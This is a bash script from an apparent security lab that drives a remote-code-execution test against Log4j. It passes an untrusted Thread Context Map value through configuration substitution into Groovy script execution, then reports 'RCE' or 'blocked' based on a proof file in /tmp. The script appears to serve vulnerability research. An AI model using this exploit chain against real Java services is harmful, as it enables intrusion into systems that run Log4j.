#!/usr/bin/env bash
# RCE chain against the *current* Log4j releases:
#   untrusted Thread Context Map value -> evaluated as a configuration template
#   (configuration-time substitution uses the recursive ConfigurationStrSubstitutor)
#   -> the value becomes the script source Log4j compiles and executes.
#
#   ./run_script_rce.sh <log4j-version> <startup|reload>
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LIB="$ROOT/lib"
OUT="$ROOT/lab/build"
VER="${1:-2.26.1}"
ORDER="${2:-startup}"
PROOF=/tmp/log4j-lab-pwned.txt

[ -d "$OUT" ] || { echo "run lab/build.sh first"; exit 1; }

if [ "$ORDER" = "reload" ]; then
    CLASS=lab.VictimScript
else
    CLASS=lab.VictimScript2
fi

# "startup-nogroovy" runs without a script engine: the chain must fail closed.
if [ "$ORDER" = "startup-nogroovy" ]; then
    ENGINE=""
else
    ENGINE="$LIB/groovy-4.0.24.jar:$LIB/groovy-jsr223-4.0.24.jar"
fi

rm -f "$PROOF"
java -Dlog4j2.Script.enableLanguages=Groovy \
     -Dlog4j.configurationFile=log4j2-script-text.xml \
     -cp "$OUT/victim.jar:$LIB/log4j-api-$VER.jar:$LIB/log4j-core-$VER.jar:$ENGINE" \
     "$CLASS" >/tmp/log4j-lab-victim.log 2>&1

if [ -f "$PROOF" ]; then
    echo "RESULT log4j-core $VER mode=script victim=$ORDER: RCE"
    [ "${VERBOSE:-0}" = "1" ] && sed 's/^/    /' "$PROOF"
else
    echo "RESULT log4j-core $VER mode=script victim=$ORDER: blocked"
    grep -m1 -o 'Error running script.*' /tmp/log4j-lab-victim.log | sed 's/^/    /' || true
fi

exit 0
